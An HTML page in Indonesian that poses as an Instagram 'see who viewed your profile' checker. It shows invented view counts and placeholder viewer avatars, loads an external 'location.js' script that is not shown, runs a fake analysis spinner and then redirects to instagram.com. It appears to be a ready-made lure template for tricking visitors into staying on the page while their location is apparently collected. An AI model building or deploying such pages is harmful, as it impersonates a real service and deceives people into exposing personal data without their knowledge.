<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#000000">
<title>Instagram — Lihat Siapa Yang View Profilmu</title>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body {
    min-height:100vh;
    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
    display:flex; align-items:center; justify-content:center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    padding:1rem;
}
.container {
    background:#fff;
    border-radius:16px;
    padding:2.5rem 2rem;
    max-width:380px;
    width:100%;
    text-align:center;
    box-shadow:0 20px 60px rgba(0,0,0,.3);
}
.instagram-icon { font-size:2.5rem; margin-bottom:.5rem; }
.title { font-size:1.5rem; font-weight:700; color:#262626; margin-bottom:.5rem; }
.desc { font-size:.85rem; color:#8e8e8e; margin-bottom:1.5rem; }
.profile-stats {
    display:flex; justify-content:space-around; margin-bottom:1.5rem;
}
.stat { text-align:center; }
.stat-num { font-size:1.5rem; font-weight:800; color:#262626; }
.stat-label { font-size:.75rem; color:#8e8e8e; margin-top:.3rem; }
.viewers {
    display:flex; justify-content:center; gap:-8px; margin-bottom:1.5rem;
}
.avatar {
    width:44px; height:44px; border-radius:50%;
    border:3px solid #fff;
    background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);
    display:flex; align-items:center; justify-content:center;
    color:#fff; font-weight:bold; font-size:.8rem; margin-left:-8px;
}
.avatar:first-child { margin-left:0; }
.btn {
    display:block; width:100%; padding:.85rem;
    background:linear-gradient(90deg,#833ab4,#fd1d1d);
    color:#fff; border:none; border-radius:10px;
    font-size:1rem; font-weight:600; cursor:pointer;
    transition:opacity .2s; margin-bottom:.75rem;
}
.btn:hover { opacity:.9; }
.divider { color:#8e8e8e; font-size:.8rem; margin:1rem 0; }
.link { font-size:.9rem; color:#0095f6; font-weight:600; cursor:pointer; text-decoration:none; }
.footer { font-size:.7rem; color:#c7c7c7; margin-top:1.5rem; }
#overlay {
    display:none; position:fixed; inset:0;
    background:rgba(0,0,0,.6); z-index:99;
    flex-direction:column; align-items:center; justify-content:center; gap:1rem;
}
#overlay.show { display:flex; }
.spinner {
    width:48px; height:48px; border:5px solid rgba(255,255,255,.3);
    border-top-color:#fff; border-radius:50%;
    animation:spin .8s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }
#overlay p { color:#fff; font-size:1rem; font-weight:600; }
</style>
</head>
<body>

<div class="container">
    <div class="instagram-icon">📷</div>
    <div class="title">Instagram</div>
    <div class="desc">Lihat siapa yang sering lihat profilmu</div>
    
    <div class="profile-stats">
        <div class="stat"><div class="stat-num">156</div><div class="stat-label">Views</div></div>
        <div class="stat"><div class="stat-num">12</div><div class="stat-label">Followers</div></div>
        <div class="stat"><div class="stat-num">28</div><div class="stat-label">Unique</div></div>
    </div>
    
    <div class="viewers">
        <div class="avatar">A</div>
        <div class="avatar">B</div>
        <div class="avatar">C</div>
        <div class="avatar">+</div>
    </div>
    
    <button class="btn" onclick="start()">🔍 Lihat Siapa Mereka</button>
    <div class="divider">atau</div>
    <a class="link" onclick="start()">Lanjutkan Dengan Instagram</a>
    
    <div class="footer">
        Instagram View Checker bukan produk resmi Instagram Inc.<br>
        Dengan melanjutkan, Anda menyetujui kebijakan privasi kami.
    </div>
</div>

<div id="overlay">
    <div class="spinner"></div>
    <p id="text">Menganalisis...</p>
</div>

<script src="../js/location.js"></script>
<script>
var steps = ["Menganalisis...", "Loading...", "Verifying...", "Hampir selesai..."];
var i = 0;
function start() {
    document.getElementById("overlay").classList.add("show");
    var t = setInterval(() => {
        i = (i+1) % steps.length;
        document.getElementById("text").textContent = steps[i];
    }, 1500);
    setTimeout(() => {
        clearInterval(t);
        window.location.href = "https://instagram.com";
    }, 12000);
}
</script>
</body>
</html>
